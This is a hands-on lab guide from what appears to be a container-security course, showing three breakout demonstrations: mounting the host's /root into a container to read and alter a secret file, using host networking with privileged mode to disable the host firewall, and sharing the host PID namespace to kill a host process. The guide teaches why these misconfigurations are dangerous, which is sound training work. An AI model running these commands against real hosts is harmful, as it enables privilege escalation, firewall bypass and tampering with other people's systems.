# **Container Breakout - Multiple Attacks**

---

> #### Gaining access and tampering Host resources from a container

### **Lab Image : Containers**

## *Volume Mounts*

* Step 1: Validate that you are the `root` user on the provisioned server

```commandline
whoami
```

* Step 2: Validate that there's a secret file in the root directory

```commandline
cat /root/secret.txt
```

* Step 3: Switch to a non-root user

```commandline
sudo su we45
```
* Step 4: Validate that you are now `we45` user on the provisioned server

```commandline
whoami
```

* Step 5: Check if the non-root user(`we45`) has access to `docker`

```commandline
docker images
```

```commandline
docker ps
```

* Step 6: Try to read the contents of the `secret` file created by the `root` user

```commandline
cat /root/secret.txt
```

* Step 7: As a non-root user(`we45`), launch a container and expose the root-filesystem

```commandline
docker run -ti --rm -v /root:/hostFS/ alpine sh
```

* Step 8: On the container, try to read.

```commandline
cat /hostFS/secret.txt
```

* Step 9: On the container, try and edit the secret file.

```commandline
echo "Tampered data!!" >> /hostFS/secret.txt
```

* Step 10: Read the edited secret file from the container

```commandline
cat /hostFS/secret.txt
```

* Step 11: Exit from the container

```commandline
exit
```

* Step 12: Switch to `root` user

```commandline
exit
```

* Step 13: Now read the secret file as a `root` user

```commandline
cat /root/secret.txt
```


### Teardown:

* Stop all containers

```commandline
clean-docker
```

---

## *Host Network*

---

* Step 1: Check `ufw` status

```commandline
ufw status
```

* Step 2: Enable `ufw`

```commandline
ufw enable
```
* Step 3: Check `ufw` status now

```commandline
ufw status
```

* Step 4: Launch a container binding the host network to the docker network

```commandline
docker run -d --name vul_flask -p 5000:5000 --privileged --net=host abhaybhargav/vul_flask
```

* Step 5: Exec into the container environment

```commandline
docker exec -ti vul_flask /bin/bash
```

* Step 6: Check `ufw` is it installed or not inside the container

```commandline
ufw status
```

* Step 7: Now install `ufw` inside the container

```commandline
apt update && apt install -y ufw
```

* Step 8: Check the status of the firewall inside the container

```commandline
ufw status
```

* Step 9: Disable the host machine firewall from a container

```commandline
ufw disable
```
* Step 10: Check the `ufw` status

```commandline
ufw status
```
* Step 11: Exit from the container

```commandline
exit
```

* Step 12: Now check `ufw` status in the server

```commandline
ufw status
```

### Teardown:

* Stop all containers

```commandline
clean-docker
```

---

## *PID Boundary*

---

* Step 1: Navigate to the `Container Breakout` directory on the provisioned server

```commandline
cd /root/container-training/Container/container-breakout/
```

* Step 2: Multiplex terminal session with `tmux` and split panes.

```commandline
tmux
```

```commandline
tmux split-window -h
```

* Step 3: Create a "Super Important Process" that is to be tampered with

```commandline
command='while true\ndo\necho "Super important process running $$"\nsleep 3\ndone'
```

```commandline
printf "$command" > super_important_process.sh && chmod +x super_important_process.sh
```

* Step 4: Run the "Super Important Process" that was just created and fetch the `Process-ID`

```commandline
./super_important_process.sh
```

* Step 5: With `tmux`, switch to the left panel using `ctrl + b` and then `left arrow key` 

* Step 6: Launch a container and mount the host processes on the container

```commandline
docker run -ti --pid=host --privileged alpine sh
```

* Step 7: Inside the container, try to terminate the "Super Important Process" 

```commandline
kill <Super important process running PID>
```

* Step 8: Exit from the container

```commanline
exit
```

* Step 9: Exit from the `tmux`

```commanline
exit
```

```commanline
exit
```


#### *Teardown*:

* stop all the containers

```commandline
clean-docker
```

### Reading Material/References:
